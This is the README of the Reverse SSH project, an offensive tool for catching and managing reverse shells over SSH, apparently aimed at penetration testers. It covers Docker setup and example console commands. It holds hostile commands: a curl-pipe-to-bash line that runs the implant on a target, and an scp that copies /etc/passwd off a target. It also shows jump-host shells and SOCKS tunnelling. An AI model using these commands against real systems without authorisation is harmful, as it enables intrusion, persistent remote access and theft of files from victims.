# Reverse SSH
![icon](icons/On_Top_Of_Fv.png)  
(Art credit to https://www.instagram.com/smart.hedgehog.art/)

Want to use SSH for reverse shells? Now you can.

- Manage and connect to reverse shells with native SSH syntax
- Dynamic, local and remote forwarding
- Native `SCP` and `SFTP` implementations for retrieving files from your targets
- Full windows shell
- Multiple network transports, such as `http`, `websockets`, `tls` and more
- Mutual client & server authentication to create high trust control channels
And more!


```text
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+   RSSH  |
                    |    Reverse     |       |         |  Client |
                    |  SSH server    |       |         |         |
                    |                |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |   SSH   |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         |   RSSH  |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         |   RSSH  |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```



https://github.com/user-attachments/assets/11dc8d14-59f1-4bdd-9503-b70f8a0d2db1


- [Reverse SSH](#reverse-ssh)
  - [TL;DR](#tldr)
    - [Setup](#setup)
    - [Basic Usage](#basic-usage)
  - [Reference Docs](#reference-docs)
  - [Sponsors](#sponsors)
    - [Individuals](#individuals)
    - [Companies](#companies)
- [Donations, Support, or Giving Back](#donations-support-or-giving-back)

## TL;DR

### Setup

The docker release is recommended as it includes the right version of golang, and a cross compiler for windows.
```sh
# Start the server
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="<ssh_key>" -v ./data:/data reversessh/reverse_ssh
```

or docker compose:

```yaml
services:
  reversessh:
    image: reversessh/reverse_ssh
    ports:
      - "3232:2222"
    environment:
      - EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232
      - RSSH_CONSOLE_LABEL=c2.label
      - RSSH_LOG_LEVEL=INFO # DISABLED, INFO, WARNING, ERROR, FATAL
      - SEED_AUTHORIZED_KEYS=${SSH_PUBLIC_KEY}
    volumes:
      - ./data:/data
```

### Basic Usage

```sh
# Connect to the server console
ssh your.rssh.server.internal -p 3232


# List all server console commands
catcher$ help

# Build a new client and host it on the in-built webserver
catcher$ link
http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25


# curl or wget this binary to a target system then execute it,
curl http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25.sh |  bash

# then we can then list what clients are connected
catcher$ ls
                                 Targets
+------------------------------------------+-----------------------------------+
| IDs                                      | Version                           |
+------------------------------------------+-----------------------------------+
| a0baa1631fe7cfbbfae34eb7a66d46c00d2a161e | SSH-v2.2.3-1-gdf5a3f8-linux_amd64 |
| fe6c52029e37185e4c7d512edd67a6c7694e2995 |                                   |
| dummy.machine                            |                                   |
| 192.168.0.11:34542                       |                                   |
+------------------------------------------+-----------------------------------+
```

All commands support the `-h` flag for giving help.


Then typical ssh commands work, just specify your rssh server as a jump host.

```sh
# Connect to full shell
ssh -J your.rssh.server.internal:3232 dummy.machine

# Start remote forward
ssh -R 1234:localhost:1234 -J your.rssh.server.internal:3232 dummy.machine

# Start dynamic forward
ssh -D 9050 -J your.rssh.server.internal:3232 dummy.machine

# SCP
scp -J your.rssh.server.internal:3232 dummy.machine:/etc/passwd .
```

## Reference Docs 

You can find more complete documentation in the [docs](/docs/) folder. 
This includes a cheatsheet, troubleshooting and more.

## Sponsors 

A huge thanks to the following folk for donating to the RSSH project and making all this work possible! 

### Individuals
[chikamobina](https://github.com/chikamobina) for their generous donations!  
[wrighterase (ctrlzero)](https://github.com/wrighterase) for their pull requests and donation! 

### Companies

[Carapace](https://carapace.nz/) is a New Zealand based security consultancy with an extremely talented team of folk!  
[<img src="icons/carapace_logo.png">](https://carapace.nz/)


# Donations, Support, or Giving Back

The easiest way to give back to the RSSH project is by finding bugs, opening feature requests and word-of-mouth advertising it to people you think will find it useful!

However, if you want to give something back to me directly, you can do so either through Github Sponsors or sending to the either of the following wallets:

Monero (XMR):
`8A8TRqsBKpMMabvt5RxMhCFWcuCSZqGV5L849XQndZB4bcbgkenH8KWJUXinYbF6ySGBznLsunrd1WA8YNPiejGp3FFfPND`
Bitcoin (BTC):
`bc1qm9e9sfrm7l7tnq982nrm6khnsfdlay07h0dxfr`
